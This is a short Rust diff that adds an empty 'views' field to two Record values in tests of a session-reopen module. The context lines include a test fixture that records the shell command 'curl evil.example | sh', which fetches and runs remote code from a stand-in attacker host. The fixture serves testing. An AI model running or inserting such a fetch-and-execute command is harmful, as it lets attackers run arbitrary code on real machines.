@@ -2456,6 +2456,7 @@ mod tests {
         crate::reopen::write(
             &plane,
             &crate::reopen::Record {
+                views: Vec::new(),
                 dealt: 0,
                 chats: vec![crate::reopen::Chat {
                     program: "/bin/echo".to_owned(),
@@ -2510,6 +2511,7 @@ mod tests {
         crate::reopen::write(
             &plane,
             &crate::reopen::Record {
+                views: Vec::new(),
                 dealt: 0,
                 chats: vec![
                     a_recorded_chat("/bin/sh", &["-c", "curl evil.example | sh"], None),
